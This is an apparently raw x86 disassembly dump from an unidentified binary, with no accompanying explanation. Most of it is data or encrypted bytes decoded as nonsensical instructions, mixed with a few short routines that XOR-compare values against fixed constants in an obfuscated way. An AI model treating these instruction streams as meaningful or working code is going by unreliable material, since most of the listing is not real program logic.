  405db4:	sbb    BYTE PTR es:[edx],bh
  405db7:	push   ecx
  405db8:	arpl   WORD PTR [ebp-0x10c5b08a],ax
  405dbe:	push   ds
  405dbf:	adc    eax,0xef2ee76a
  405dc4:	in     al,dx
  405dc5:	dec    esi
  405dc6:	sub    DWORD PTR [edx],ebp
  405dc8:	mov    cl,0x25
  405dca:	mov    esi,0x509545ee
  405dcf:	pop    ss
  405dd0:	ja     0x405d9d
  405dd2:	push   ss
  405dd3:	or     DWORD PTR [esi+ecx*2],ebp
  405dd6:	popa   
  405dd7:	addr16 out dx,eax
  405dd9:	data16 fsubr DWORD PTR [esi]
  405ddc:	cmp    al,BYTE PTR [esi-0x16]
  405ddf:	xchg   BYTE PTR [eax+ebx*2+0x7b],ch
  405de3:	ss sahf 
  405de5:	or     eax,0x10770745
  405dea:	jmp    0x4f76:0xe24848e0
  405df1:	retf   
  405df2:	adc    DWORD PTR [ecx],edi
  405df4:	cmp    ebx,ecx
  405df6:	cwde   
  405df7:	rcl    BYTE PTR [eax],cl
  405df9:	sar    BYTE PTR [edx+edx*2-0x2c],cl
  405dfd:	mov    ds:0xac94b77f,eax
  405e02:	out    dx,eax
  405e03:	stos   BYTE PTR es:[edi],al
  405e04:	inc    ecx
  405e05:	and    BYTE PTR [edx+edi*1-0x5d],al
  405e09:	jbe    0x405dba
  405e0b:	mov    esp,0x1d108a6d
  405e10:	das    
  405e11:	cmp    al,bh
  405e13:	in     eax,0x52
  405e15:	push   0x2ff24187
  405e1a:	stos   DWORD PTR es:[edi],eax
  405e1b:	dec    eax
  405e1c:	xchg   ebp,eax
  405e1d:	jecxz  0x405e48
  405e1f:	cmp    DWORD PTR [ebx-0x22],0x53dcb925
  405e26:	clc    
  405e27:	lods   eax,DWORD PTR ds:[esi]
  405e28:	rcr    dh,cl
  405e2a:	push   esi
  405e2b:	add    eax,DWORD PTR [esi]
  405e2d:	pop    ds
  405e2e:	movzx  ebp,cl
  405e31:	mov    ch,BYTE PTR [esi-0x6dbb89b0]
  405e37:	cmp    edx,esp
  405e39:	push   ds
  405e3a:	int3   
  405e3b:	js     0x405e3a
  405e3d:	fcomp  DWORD PTR [esi+0x78f74c1c]
  405e43:	mov    esp,0x9de250e7
  405e48:	(bad)  
  405e49:	fsub   QWORD PTR [ebx]
  405e4b:	xor    BYTE PTR [esi+esi*1],al
  405e4e:	push   esi
  405e4f:	dec    edx
  405e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e51:	add    DWORD PTR [esi+0x57759ced],edi
  405e57:	sub    BYTE PTR [eax],bl
  405e59:	push   ebp
  405e5a:	clc    
  405e5b:	inc    esp
  405e5c:	loope  0x405ed1
  405e5e:	int3   
  405e5f:	xor    eax,0x8b044e8b
  405e64:	enter  0xe1c1,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	ds fucom st(0)
  405e88:	jb     0x405e6b
  405e8a:	nop
  405e8b:	mov    esi,0xbdbebe2d
  405e90:	les    edi,FWORD PTR [esi+0x57ac90be]
  405e96:	les    esi,FWORD PTR [ecx+0x33]
  405e99:	call   0x9cc9:0x3281ee7a
  405ea0:	xor    bl,BYTE PTR [ebx+0x39]
  405ea3:	and    BYTE PTR [edi-0x7722f889],cl
  405ea9:	not    ah
  405eab:	adc    DWORD PTR [edi+0x6b],edi
  405eae:	lahf   
  405eaf:	dec    edi
  405eb0:	leave  
  405eb1:	jp     0x405e4d
  405eb3:	ja     0x405eeb
  405eb5:	xchg   ebp,eax
  405eb6:	rol    BYTE PTR [ecx-0x2],1
  405eb9:	mov    DWORD PTR [edx],eax
  405ebb:	adc    BYTE PTR ds:0xfa8f911d,cl
  405ec1:	lods   al,BYTE PTR ds:[esi]
  405ec2:	jmp    0x405f31
  405ec4:	push   edi
  405ec5:	repnz xchg edi,eax
  405ec7:	lods   al,BYTE PTR ds:[esi]
  405ec8:	xchg   BYTE PTR [ecx+0x3],bl
  405ecb:	iret   
  405ecc:	sbb    DWORD PTR [edx+esi*1],edi
  405ecf:	mov    ah,0x56
  405ed1:	loopne 0x405e75
  405ed3:	adc    BYTE PTR [ecx-0x4b],dl
  405ed6:	inc    edi
  405ed7:	dec    ebp
  405ed8:	ds jge 0x405f33
  405edb:	cmp    cl,ah
  405edd:	lock in ax,0x87
  405ee1:	add    eax,0x7589f0a2
  405ee6:	dec    edi
  405ee7:	jae    0x405e83
  405ee9:	into   
  405eea:	pusha  
  405eeb:	sbb    al,0x2e
  405eed:	mov    cl,0x9
  405eef:	push   cs
  405ef0:	das    
  405ef1:	dec    edi
  405ef2:	test   BYTE PTR [edx-0x53eba917],dl
  405ef8:	icebp  
  405ef9:	cmp    DWORD PTR [ebx+0x5d],0x7e
  405efd:	add    al,0xab
  405eff:	ficomp DWORD PTR [eax]
  405f01:	fcmove st,st(1)
  405f03:	pop    ds
  405f04:	sub    DWORD PTR [esi+0x4d5e40fd],esp
  405f0a:	sar    DWORD PTR [ecx-0x21],cl
  405f0d:	xor    al,0x6d
  405f0f:	jg     0x405f53
  405f11:	retf   
  405f12:	and    BYTE PTR [edi],0x53
  405f15:	and    al,BYTE PTR [ebp-0x245343db]
  405f1b:	sar    BYTE PTR [edx+0x3227b612],0x15
  405f22:	sbb    BYTE PTR ds:[edx],ch
  405f25:	xor    esp,edi
  405f27:	fimul  DWORD PTR [eax+0x4c]
  405f2a:	adc    BYTE PTR [ebp+0xe],cl
  405f2d:	call   0x94612caa
  405f32:	xor    BYTE PTR [edi-0x23],al
  405f35:	push   edi
  405f36:	lock push esi
  405f38:	pop    ds
  405f39:	sbb    eax,0xa69fdf39
  405f3e:	mov    esp,0x83b08690
  405f43:	and    esi,DWORD PTR [ecx+0x14]
  405f46:	out    dx,eax
  405f47:	in     eax,0x64
  405f49:	aam    0x95
  405f4b:	sub    eax,0x43cce783
  405f50:	fs gs enter 0xd8fa,0x51
  405f56:	sbb    dl,ah
  405f58:	or     eax,0xcde40896
  405f5d:	mov    ds:0x86ae8be0,eax
  405f62:	neg    BYTE PTR [esi]
  405f64:	repz or al,BYTE PTR [edi-0x7b]
  405f68:	and    al,0x7f
  405f6a:	aam    0x4c
  405f6c:	out    0xed,eax
  405f6e:	push   esi
  405f6f:	pushf  
  405f70:	mov    eax,0x392c8859
  405f75:	cdq    
  405f76:	inc    edx
  405f77:	call   0x467f8d5a
  405f7c:	sub    ebp,ebx
  405f7e:	mov    ds:0x1693ebfa,al
  405f83:	jl     0x405fc9
  405f85:	add    ah,bh
  405f87:	lahf   
  405f88:	aad    0x5f
  405f8a:	fstp   QWORD PTR [ebp+0x20]
  405f8d:	int    0xb0
  405f8f:	(bad)  [edi-0x2f]
  405f92:	mov    eax,0x69b79705
  405f97:	adc    cl,BYTE PTR [eax]
  405f99:	clc    
  405f9a:	and    ah,ch
  405f9c:	sahf   
  405f9d:	jmp    0x3a5cc234
  405fa2:	pop    esi
  405fa3:	jae    0x405f6a
  405fa5:	mov    esi,0x502db73d
  405faa:	into   
  405fab:	dec    esi
  405fac:	push   edx
  405fad:	gs cwde 
  405faf:	gs dec ecx
  405fb1:	into   
  405fb2:	inc    eax
  405fb3:	(bad)  
  405fb4:	cmc    
  405fb5:	mov    edi,0x5d87672e
  405fba:	pop    ebp
  405fbb:	daa    
  405fbc:	fidiv  WORD PTR [esi+edi*1]
  405fbf:	mov    edi,DWORD PTR [ebx]
  405fc1:	jno    0x40600c
  405fc3:	ja     0x40600f
  405fc5:	adc    al,0x27
  405fc7:	push   ss
  405fc8:	and    BYTE PTR cs:[eax+ebx*8],dh
  405fcc:	call   DWORD PTR [esi]
  405fce:	adc    dh,BYTE PTR [eax+0x58]
  405fd1:	or     eax,0xfc0dacab
  405fd6:	xchg   ecx,eax
  405fd7:	scas   eax,DWORD PTR es:[edi]
  405fd8:	dec    esi
  405fd9:	retf   0x6f6a
  405fdc:	les    eax,FWORD PTR [eax-0x5b8a9c59]
  405fe2:	adc    DWORD PTR [edx-0x32d9762a],esi
  405fe8:	add    cl,BYTE PTR [edi+ebx*1]
  405feb:	jb     0x406069
  405fed:	xchg   BYTE PTR [ebx+eax*2-0x118ff4d9],bh
  405ff4:	out    dx,eax
  405ff5:	sti    
  405ff6:	mov    dh,0x92
  405ff8:	sbb    eax,0xcb9e82a7
  405ffd:	int3   
  405ffe:	fisubr DWORD PTR [esi+0x69]
  406001:	adc    al,0xd5
  406003:	mov    ebp,0x2716570e
  406008:	int    0xbb
  40600a:	jae    0x405fc9
  40600c:	test   DWORD PTR [esi],ebp
  40600e:	and    DWORD PTR [eax+0x7a],0x2ea07103
  406015:	ja     0x40606e
  406017:	jmp    0x97ee2690
  40601c:	es jecxz 0x406008
  40601f:	call   0xe50a4e9c
  406024:	xchg   esp,eax
  406025:	rcr    BYTE PTR [edi-0x104ab422],0xcb
  40602c:	jb     0x40606e
  40602e:	pop    edi
  40602f:	mov    ah,0x5
  406031:	pop    ebp
  406032:	mov    bl,0xc5
  406034:	(bad)  
  406035:	lahf   
  406036:	jno    0x40602e
  406038:	xor    BYTE PTR [ecx+eiz*1],ah
  40603b:	mov    bl,BYTE PTR [ebx-0x2a]
  40603e:	popf   
  40603f:	cs push eax
  406041:	out    dx,eax
  406042:	push   0x10
  406044:	pop    ds
  406045:	enter  0xa2b1,0x8c
  406049:	std    
  40604a:	xchg   edx,eax
  40604b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40604c:	inc    ecx
  40604d:	and    eax,0x8c0fe798
  406052:	jne    0x406082
  406054:	fld1   
  406056:	ret    
  406057:	in     eax,0xe9
  406059:	adc    ch,BYTE PTR [esi-0x59]
  40605c:	mov    al,0xc5
  40605e:	xor    dl,BYTE PTR [ecx+0xa70b5ac]
  406064:	jle    0x406031
  406066:	sbb    bl,BYTE PTR [ecx]
  406068:	mov    dl,0xf7
  40606a:	or     eax,0xe4aac00a
  40606f:	jnp    0x40602b
  406071:	daa    
  406072:	pop    ebx
  406073:	sub    BYTE PTR [edi],bl
  406075:	xchg   edx,eax
  406076:	mov    bl,cl
  406078:	add    al,0x6f
  40607a:	imul   eax,DWORD PTR [esi+0x717b3a1e],0xffffffbe
  406081:	outs   dx,DWORD PTR ds:[esi]
  406082:	loop   0x40600c
  406084:	mov    DWORD PTR [esi],ecx
  406086:	(bad)  
  406087:	arpl   WORD PTR [eax],sp
  406089:	mov    esp,0x161ff2e5
  40608e:	sub    dl,ch
  406090:	pop    es
  406091:	xchg   ebx,eax
  406092:	mov    ds:0x215c58d6,eax
  406097:	inc    ebx
  406098:	push   ebp
  406099:	cli    
  40609a:	push   es
  40609b:	outs   dx,BYTE PTR ds:[esi]
  40609c:	mov    esi,0xd0cc896f
  4060a1:	mov    esp,0xafdf714b
  4060a6:	setne  BYTE PTR [edx+0x53b40065]
  4060ad:	sbb    BYTE PTR [edi+0x35],bl
  4060b0:	call   0x9e41f53a
  4060b5:	daa    
  4060b6:	retf   0x6e45
  4060b9:	aam    0xcd
  4060bb:	neg    BYTE PTR [ebx-0x5d]
  4060be:	sbb    ebx,DWORD PTR ds:0xadd92b49
  4060c4:	jg     0x406063
  4060c6:	enter  0x824e,0x4e
  4060ca:	loope  0x4060ef
  4060cc:	add    al,0xcd
  4060ce:	cmp    al,0xb8
  4060d0:	sbb    dl,bl
  4060d2:	cmp    eax,0xca0916b3
  4060d7:	mov    ebx,0xcca9624d
  4060dc:	in     al,0x4c
  4060de:	fnstsw WORD PTR ds:0x3d92b19c
  4060e4:	sbb    DWORD PTR [ebx-0x28],esi
  4060e7:	cmp    DWORD PTR ds:0x9855a948,ebp
  4060ed:	and    ah,cl
  4060ef:	rol    ah,1
  4060f1:	push   edi
  4060f2:	mov    dh,0x6f
  4060f4:	mov    eax,0x39eb578f
  4060f9:	lock rol DWORD PTR [edx],0x56
  4060fd:	leave  
  4060fe:	cmp    BYTE PTR [edi],ah
  406100:	fcmovne st,st(7)
  406102:	dec    esi
  406103:	mov    DWORD PTR [edx+0x75620e01],ebp
  406109:	and    eax,0x1c8e1909
  40610e:	test   al,dh
  406110:	and    DWORD PTR [ecx+0xe],eax
  406113:	mov    esi,0x44681a98
  406118:	ret    0x37c1
  40611b:	lods   eax,DWORD PTR ds:[esi]
  40611c:	xchg   ebx,eax
  40611d:	fwait
  40611e:	mov    esp,0xd3c9db05
  406123:	xor    al,0xa9
  406125:	push   0xc
  406127:	dec    esi
  406128:	test   eax,0xffeb0524
  40612e:	iret   
  40612f:	inc    esp
  406130:	ins    DWORD PTR es:[edi],dx
  406131:	push   cs
  406132:	jge    0x40612a
  406134:	sbb    cx,WORD PTR cs:[eax]
  406138:	daa    
  406139:	jns    0x406103
  40613b:	pop    esp
  40613c:	iret   
  40613d:	mov    WORD PTR [ebp+0x48fba755],?
  406143:	into   
  406144:	shl    BYTE PTR [edi+ecx*8+0x2f365071],0x62
  40614c:	adc    DWORD PTR [ecx],esi
  40614e:	je     0x406107
  406150:	xor    BYTE PTR [edx],0xd6
  406153:	imul   ebx,DWORD PTR [edx-0xd],0x6a
  406157:	sub    DWORD PTR [ebp+0x2b],ebp
  40615a:	pop    esi
  40615b:	mov    dl,0x50
  40615d:	in     al,dx
  40615e:	arpl   WORD PTR [ebp-0x444ed651],bx
  406164:	push   ds
  406165:	call   0x8611:0x6f05d9
  40616c:	hlt    
  40616d:	in     al,dx
  40616e:	cmp    eax,0x9178fc07
  406173:	xchg   edi,eax
  406174:	jne    0x4061e8
  406176:	xchg   ebp,eax
  406177:	add    edx,DWORD PTR cs:[ebx]
  40617a:	sub    al,0x22
  40617c:	jno    0x4061fd
  40617e:	add    eax,0x600f85b5
  406183:	jno    0x4061df
  406185:	int    0x64
  406187:	les    ecx,FWORD PTR [ebx+0x4c5f60a]
  40618d:	push   ds
  40618e:	pusha  
  40618f:	mov    bh,0xd8
  406191:	arpl   WORD PTR [edi],sp
  406193:	stos   BYTE PTR es:[edi],al
  406194:	or     al,0x66
  406196:	dec    ebp
  406197:	adc    DWORD PTR [edx+0x509a0d49],ebp
  40619d:	mov    ebp,0xa562e8f3
  4061a2:	push   ebx
  4061a3:	fidivr WORD PTR [ebp-0x74]
  4061a6:	stc    
  4061a7:	push   ss
  4061a8:	hlt    
  4061a9:	jmp    0x57a8f05e
  4061ae:	pop    ebx
  4061af:	das    
  4061b0:	mov    ah,0x1
  4061b2:	xor    BYTE PTR [edi+0x6b349f1b],dl
  4061b8:	in     al,0xb3
  4061ba:	xchg   ecx,eax
  4061bb:	ins    DWORD PTR es:[edi],dx
  4061bc:	mov    DWORD PTR [ebx-0x36377ff4],ebp
  4061c2:	or     BYTE PTR [edx-0x752ff4b9],bl
  4061c8:	push   edx
  4061c9:	mov    cl,0x17
  4061cb:	inc    ebp
  4061cc:	sbb    eax,DWORD PTR [edi+ebx*8+0x27e9bc1e]
  4061d3:	inc    ebx
  4061d4:	es inc edi
  4061d6:	pop    esi
  4061d7:	pop    esp
  4061d8:	jmp    0x406181
  4061da:	aaa    
  4061db:	jecxz  0x40619b
  4061dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061de:	ins    DWORD PTR es:[edi],dx
  4061df:	clc    
  4061e0:	rcr    DWORD PTR [esi-0x17ba2955],0xcb
  4061e7:	xchg   dl,ah
  4061e9:	mov    bl,0x18
  4061eb:	call   0x2b4edee7
  4061f0:	nop
  4061f1:	pusha  
  4061f2:	xchg   DWORD PTR [esi-0x57],ebp
  4061f5:	test   BYTE PTR [ebx+0x6b],cl
  4061f8:	jnp    0x4061f5
  4061fa:	clc    
  4061fb:	xor    BYTE PTR [ecx+edi*8],0xd3
  4061ff:	shr    DWORD PTR [eax+0x55],1
  406202:	push   cs
  406203:	sub    BYTE PTR [edx+0x5dc21e8d],dh
  406209:	neg    DWORD PTR ds:0xb579a503
  40620f:	pop    esp
  406210:	popf   
  406211:	pop    edx
  406212:	jl     0x406284
  406214:	mov    ebp,0xf281177f
  406219:	call   0x81dc8da8
  40621e:	icebp  
  40621f:	ja     0x4061d6
  406221:	jns    0x4061ee
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	aam    0x31
  4062ea:	lock iret 
  4062ec:	mov    ebp,0xbdbebe33
  4062f1:	les    edi,FWORD PTR [esi-0x7e544242]
  4062f7:	ret    
  4062f8:	and    BYTE PTR ds:0x266ac461,ch
  4062fe:	test   dh,bl
  406300:	or     DWORD PTR [ebx],esp
  406302:	sub    ah,BYTE PTR [esi+0x3b76e04]
  406308:	inc    esp
  406309:	sub    al,0x38
  40630b:	inc    ebp
  40630c:	test   DWORD PTR [ebx],ecx
  40630e:	mov    ecx,0x69b4d149
  406313:	lock dec ebp
  406315:	shr    BYTE PTR [edx-0x7a56e190],cl
  40631b:	add    DWORD PTR [ecx-0x2],esi
  40631e:	jo     0x406331
  406320:	nop
  406321:	xor    edx,DWORD PTR [edi+0x71]
  406324:	mov    dh,0x10
  406326:	dec    esp
  406327:	rcr    DWORD PTR [edx+esi*2-0x69],cl
  40632b:	ins    BYTE PTR es:[edi],dx
  40632c:	enter  0x46f0,0x55
  406330:	mov    WORD PTR [eax+ecx*4],ds
  406333:	sub    bh,al
  406335:	inc    eax
  406336:	and    DWORD PTR [ebx],esp
  406338:	mov    ebp,0xfae2bec8
  40633d:	mov    ebp,0xef4fd9b0
  406342:	xor    bh,BYTE PTR ds:0xac3deaec
  406348:	adc    edx,DWORD PTR [esi-0x4012c5]
  40634e:	mov    ch,0x8f
  406350:	(bad)  
  406351:	fbstp  TBYTE PTR [edi]
  406353:	outs   dx,DWORD PTR ds:[esi]
  406354:	sbb    BYTE PTR [eax+esi*2-0x7b3cf49d],bl
  40635b:	sub    bl,BYTE PTR [eax]
  40635d:	and    edi,DWORD PTR [edi+0x73]
  406360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406361:	pop    ecx
  406362:	into   
  406363:	in     al,0xdd
  406365:	or     ah,bl
  406367:	xchg   edx,eax
  406368:	push   edi
  406369:	jae    0x406374
  40636b:	mov    bh,0xa3
  40636d:	mov    ds:0xcb54d527,eax
  406372:	mov    ss,WORD PTR [ecx]
  406374:	int3   
  406375:	sti    
  406376:	rcr    DWORD PTR [edi-0x55ab3a5a],1
  40637c:	and    al,0xaa
  40637e:	mov    al,ds:0x1148466b
  406383:	leave  
  406384:	add    DWORD PTR [eax-0x25],edx
  406387:	fucomi st,st(5)
  406389:	jb     0x4063ec
  40638b:	jnp    0x406337
  40638d:	mov    gs,WORD PTR [ecx-0x3c]
  406390:	and    BYTE PTR [ecx-0x35],dh
  406393:	mov    eax,0x24166c06
  406398:	jg     0x4063d1
  40639a:	jecxz  0x40639f
  40639c:	mov    esi,0x8f577e33
  4063a1:	mov    al,0x97
  4063a3:	xlat   BYTE PTR ds:[ebx]
  4063a4:	sahf   
  4063a5:	in     al,dx
  4063a6:	mov    ah,0x31
  4063a8:	cdq    
  4063a9:	int    0xb
  4063ab:	pop    esi
  4063ac:	(bad)  
  4063ad:	inc    ecx
  4063ae:	add    al,0x92
  4063b0:	xor    bl,BYTE PTR [ebp+0x12]
  4063b3:	and    dl,0xa6
  4063b6:	push   ds
  4063b7:	stos   DWORD PTR es:[edi],eax
  4063b8:	xor    edi,DWORD PTR [esi-0x4d3c7e33]
  4063be:	sub    al,0x6b
  4063c0:	mov    esi,0x4c455c06
  4063c5:	dec    ebx
  4063c6:	add    BYTE PTR [ecx],al
  4063c8:	aad    0x78
  4063ca:	in     al,0xd8
  4063cc:	cmp    eax,0x82f46d03
  4063d1:	mov    dh,0x7c
  4063d3:	ror    DWORD PTR [ebp+0xd07952a],1
  4063d9:	xchg   edx,eax
  4063da:	xor    DWORD PTR [eax],ecx
  4063dc:	xor    cl,BYTE PTR [edi]
  4063de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063df:	test   eax,0x6f2b63b8
  4063e4:	jl     0x406390
  4063e6:	out    0xab,eax
  4063e8:	(bad)  
  4063e9:	jno    0x406469
  4063eb:	outs   dx,DWORD PTR ds:[esi]
  4063ec:	(bad)  
  4063ed:	xchg   edi,eax
  4063ee:	shl    edi,cl
  4063f0:	jg     0x406454
  4063f2:	in     eax,dx
  4063f3:	push   ebx
  4063f4:	loopne 0x4063bc
  4063f6:	popa   
  4063f7:	jl     0x4063b8
  4063f9:	imul   esp,DWORD PTR [esi+0x716b4e42],0xffffffa5
  406400:	daa    
  406401:	cmp    eax,0x56560d17
  406406:	push   esi
  406407:	scas   eax,DWORD PTR es:[edi]
  406408:	adc    ebp,DWORD PTR [ebp-0xa482f2a]
  40640e:	imul   DWORD PTR [eax-0x4a]
  406411:	arpl   WORD PTR [edx-0x2d],bp
  406414:	push   ebp
  406415:	jnp    0x40640c
  406417:	loopne 0x4063b8
  406419:	xchg   BYTE PTR [ebp-0x64ed2389],ah
  40641f:	repz pop edi
  406421:	fwait
  406422:	and    esp,DWORD PTR [edx]
  406424:	push   ecx
  406425:	adc    ecx,DWORD PTR [eax]
  406427:	cmp    eax,DWORD PTR [esi-0x7c4bd2ca]
  40642d:	adc    BYTE PTR [ebx-0x22ffdb09],dh
  406433:	jle    0x4063fc
  406435:	arpl   WORD PTR [esi],bp
  406437:	cmp    cl,dh
  406439:	call   0x720f:0xab0d16e7
  406440:	(bad)  
  406441:	out    dx,eax
  406442:	dec    ebx
  406443:	adc    ecx,DWORD PTR ds:0x7d4dc67b
  406449:	add    al,0x71
  40644b:	dec    edi
  40644c:	leave  
  40644d:	icebp  
  40644e:	add    eax,0xd9222cba
  406453:	cmp    esi,DWORD PTR [edx]
  406455:	sar    dl,cl
  406457:	test   eax,0xad7a6073
  40645c:	test   BYTE PTR [esi],al
  40645e:	outs   dx,BYTE PTR ds:[esi]
  40645f:	in     al,dx
  406460:	fxam   
  406462:	dec    esp
  406463:	stc    
  406464:	mov    ds:0x9d837584,al
  406469:	add    al,0xd4
  40646b:	or     eax,DWORD PTR [esi+0x1bf0cdd4]
  406471:	dec    edi
  406472:	jle    0x406401
  406474:	addr16 xor al,0xf2
  406477:	(bad)  
  406478:	mov    dh,0x24
  40647a:	int    0x6
  40647c:	mov    esp,0x25b0d221
  406481:	les    esi,FWORD PTR [eax-0x30278dfc]
  406487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406488:	loopne 0x4064dc
  40648a:	mov    ss,WORD PTR [eax-0x2bfdf94f]
  406490:	pop    ebx
  406491:	dec    ecx
  406492:	mov    ch,0x26
  406494:	push   0x7707b1ae
  406499:	xor    BYTE PTR [edi],cl
  40649b:	xchg   esi,eax
  40649c:	mov    ebp,0xba588f7a
  4064a1:	adc    eax,0xd4bab4a6
  4064a6:	xor    bl,BYTE PTR [edx+0x29]
  4064a9:	add    BYTE PTR [edi-0x57e6bc6d],0xa4
  4064b0:	fcom   QWORD PTR [ebx-0x2bc9eeb4]
  4064b6:	dec    eax
  4064b7:	rcr    DWORD PTR [edx+ebx*4],0x9e
  4064bb:	add    edx,DWORD PTR [edx]
  4064bd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4064c0:	fnsave [edi+ebx*2]
  4064c3:	adc    bh,cl
  4064c5:	addr16 dec ebx
  4064c7:	pop    esi
  4064c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c9:	out    dx,eax
  4064ca:	aam    0xf3
  4064cc:	icebp  
  4064cd:	cmp    ecx,0xfffffffb
  4064d0:	add    dl,BYTE PTR [edi-0x1]
  4064d3:	jle    0x4064c0
  4064d5:	movhlps xmm3,xmm5
  4064d8:	jnp    0x4064d7
  4064da:	sub    DWORD PTR [ebp-0x80],ebx
  4064dd:	stos   BYTE PTR es:[edi],al
  4064de:	rol    BYTE PTR [ecx+ebp*2],0x5b
  4064e2:	mov    ah,0x69
  4064e4:	pop    ecx
  4064e5:	or     ebx,ebp
  4064e7:	or     BYTE PTR [edi],bh
  4064e9:	pop    eax
  4064ea:	repnz loopne 0x406504
  4064ed:	mov    DWORD PTR [edx],eax
  4064ef:	shl    DWORD PTR [ebx-0x3b],1
  4064f2:	mov    WORD PTR [ecx-0x64],ds
  4064f5:	not    BYTE PTR [ecx+0x4]
  4064f8:	push   esi
  4064f9:	ja     0x406552
  4064fb:	or     DWORD PTR [esi],ecx
  4064fd:	xchg   edx,eax
  4064fe:	push   eax
  4064ff:	stos   BYTE PTR es:[edi],al
  406500:	gs pop es
  406502:	xchg   al,al
  406504:	std    
  406505:	arpl   WORD PTR [eax-0x4e0ee33d],bx
  40650b:	add    dl,ch
  40650d:	aas    
  40650e:	xchg   esi,eax
  40650f:	mov    eax,0x237f794e
  406514:	fsubrp st(3),st
  406516:	or     BYTE PTR es:[eax],dl
  406519:	cwde   
  40651a:	loop   0x40650c
  40651c:	ins    BYTE PTR es:[edi],dx
  40651d:	shl    BYTE PTR [eax-0x624dd1a],1
  406523:	and    edi,ebx
  406525:	(bad)  
  406526:	aas    
  406527:	pop    ss
  406528:	test   eax,0x1f1277d4
  40652d:	(bad)  
  40652f:	jp     0x406525
  406531:	jg     0x40655e
  406533:	ret    0x1272
  406536:	loop   0x40654b
  406538:	fs aas 
  40653a:	in     al,0xec
  40653c:	ds or  bh,0x8e
  406540:	and    DWORD PTR [esi],0x919a5ce9
  406546:	jmp    0x4064e2
  406548:	add    bl,BYTE PTR [eax+0x34]
  40654b:	cmp    cl,BYTE PTR [esi-0x559e3da2]
  406551:	dec    DWORD PTR [edi]
  406553:	push   ebx
  406554:	mov    ch,BYTE PTR [eax+0x54bc80fd]
  40655a:	adc    ecx,DWORD PTR [ebx-0x40]
  40655d:	dec    ebp
  40655e:	adc    BYTE PTR [ecx+0x6],al
  406561:	test   DWORD PTR [esi-0x6a],ecx
  406564:	pop    ecx
  406565:	jmp    0x406576
  406567:	dec    eax
  406568:	sub    eax,0xacae63dc
  40656d:	fcmovbe st,st(3)
  40656f:	xor    al,0x4f
  406571:	push   ebx
  406572:	(bad)  
  406574:	out    dx,al
  406575:	iret   
  406576:	dec    esi
  406577:	pop    ecx
  406578:	enter  0x7506,0xba
  40657c:	retf   
  40657d:	fisub  WORD PTR [ecx+ebp*1]
  406580:	es push ss
  406582:	lock imul ebx,ecx,0xf014a734
  406589:	out    0x3,eax
  40658b:	sbb    eax,0x2b3e66c9
  406590:	and    al,0x8
  406592:	hlt    
  406593:	cmp    dl,0xba
  406596:	add    DWORD PTR [ecx+ebp*1-0x5e],edx
  40659a:	mov    bh,0x28
  40659c:	jmp    DWORD PTR [edi-0x29]
  40659f:	or     ebp,eax
  4065a1:	or     edx,DWORD PTR [edx-0x70]
  4065a4:	retf   
  4065a5:	and    eax,0xfa99d9b3
  4065aa:	test   DWORD PTR ds:0xbac7cded,ecx
  4065b0:	or     eax,0xd49a1b9
